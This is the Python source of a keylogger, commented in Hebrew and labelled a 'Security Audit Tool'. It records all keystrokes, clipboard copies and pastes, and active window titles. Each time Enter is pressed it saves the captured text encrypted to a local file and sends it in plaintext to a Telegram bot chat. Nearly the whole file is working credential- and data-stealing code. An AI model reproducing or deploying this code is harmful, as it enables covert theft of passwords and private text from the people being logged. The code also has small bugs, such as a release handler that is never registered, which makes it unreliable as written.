import os
import tkinter as tk
from tkinter import scrolledtext
from pynput import keyboard
import urllib.request
import urllib.parse
import sys
import pygetwindow as gw
import time
import pyperclip
from cryptography.fernet import Fernet
from dotenv import load_dotenv

load_dotenv()
#  הגדרות
ENCRYPTION_KEY = os.getenv("ENCRYPTION_KEY")
CAPTURED_DATA_FILE = "captured_data.txt"
TELEGRAM_TOKEN = os.getenv("TELEGRAM_TOKEN")
TELEGRAM_CHAT_ID = os.getenv("TELEGRAM_CHAT_ID")

def encrypt_text(text):
    if not ENCRYPTION_KEY:
        raise ValueError("Missing encryption key")

    f = Fernet(ENCRYPTION_KEY.encode())
    return f.encrypt(text.encode()).decode()

# ה-buffer שומר את כל מה שמוקלד
current_buffer = []

# יש להגדיר את הרשימה הזו מחוץ לפונקציה כדי שתשמור את ההיסטוריה
clipboard_backlog = []

# דגל גלובלי למעקב אחר מצב ה-Ctrl
is_ctrl_pressed = False

def send_telegram(text):
    if not TELEGRAM_TOKEN or not TELEGRAM_CHAT_ID:
        txt_area.insert(tk.END, "\n[Telegram disabled - missing token/chat id]\n")
        return

    try:
        url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
        data = urllib.parse.urlencode({
            'chat_id': TELEGRAM_CHAT_ID,
            'text': text
        }).encode('utf-8')

        urllib.request.urlopen(url, data=data, timeout=5)

    except Exception as e:
        txt_area.insert(tk.END, f"\n[Telegram error: {e}]\n")


def on_press(key):
    global current_buffer
    global is_ctrl_pressed

    try:
        # 1. עדכון מצב ה-Ctrl
        if key in (keyboard.Key.ctrl_l, keyboard.Key.ctrl_r):
            is_ctrl_pressed = True
            return

        # שליפת מזהי המקש בצורה בטוחה
        vk = getattr(key, 'vk', None)
        char = getattr(key, 'char', None)

        # 2. טיפול בהעתקה והדבקה (רק כש-Ctrl לחוץ)
        if is_ctrl_pressed:
            # זיהוי העתקה - חסין לשפות
            if vk == 67 or char in ['c', 'C', 'ב', '\x03']:
                current_buffer.append(" [CTRL-C] ")
                txt_area.insert(tk.END, " [CTRL-C] ")

                time.sleep(0.1)
                copied_text = pyperclip.paste()

                if copied_text and (not clipboard_backlog or clipboard_backlog[-1] != copied_text):
                    clipboard_backlog.append(copied_text)
                return  # עוצרים כאן כדי שהאות לא תירשם כטקסט רגיל בהמשך

            # זיהוי הדבקה - חסין לשפות
            elif vk == 86 or char in ['v', 'V', 'ה', '\x16']:
                pasted_text = pyperclip.paste()

                current_buffer.append(f" [CTRL-V]: {pasted_text} [PASTE END]")
                txt_area.insert(tk.END, f" [CTRL-V]: {pasted_text} [PASTE END]")
                return
        if hasattr(key, 'char') and key.char is not None:
            current_buffer.append(key.char)
            txt_area.insert(tk.END, key.char)
        elif key == keyboard.Key.space:
            current_buffer.append(" ")
            txt_area.insert(tk.END, " ")
        elif key == keyboard.Key.tab:
            current_buffer.append(" [TAB] ")
            txt_area.insert(tk.END, " [TAB] ")
        elif key == keyboard.Key.enter:
            # שליחה רק ב-Enter
            window = gw.getActiveWindow()
            site = window.title if window else "Unknown Window"

            data = "".join(current_buffer)
            if data:
                with open(CAPTURED_DATA_FILE, "a", encoding="utf-8") as f:
                    encrypted_data = encrypt_text(f"Site: {site} | Data: {data}")
                    with open(CAPTURED_DATA_FILE, "a", encoding="utf-8") as f:
                        f.write(encrypted_data + "\n")
                send_telegram(f"Captured from {site}:\n{data}")
                txt_area.insert(tk.END, "\n[ENTER - SENT]\n")
                current_buffer = []  # איפוס הזיכרון
    except Exception as e:
                print(e)

def on_release(key):
    global is_ctrl_pressed

    # כיבוי הדגל כשמשחררים את ה-Ctrl
    if key in (keyboard.Key.ctrl_l, keyboard.Key.ctrl_r):
        is_ctrl_pressed = False


def stop_program():
    root.quit()
    sys.exit(0)


# --- GUI ---
root = tk.Tk()
root.title("Keylogger - Security Audit Tool")
root.geometry("600x500")
root.configure(bg="#2d2d2d")

tk.Label(root, text="MONITORING ACTIVE", bg="#2d2d2d", fg="white", font=("Arial", 12)).pack(pady=10)
txt_area = scrolledtext.ScrolledText(root, width=65, height=18, bg="#1e1e1e", fg="#00ff00", font=("Consolas", 11))
txt_area.pack(pady=10)
txt_area.bind('<Control-v>', lambda e: 'break')
txt_area.bind('<Control-V>', lambda e: 'break')
txt_area.bind('<Key>', lambda e: 'break')
tk.Button(root, text="STOP & EXIT", command=stop_program, bg="#ff0000", fg="white", font=("Arial", 12, "bold")).pack(
    pady=10)

keyboard.Listener(on_press=on_press).start()
root.mainloop()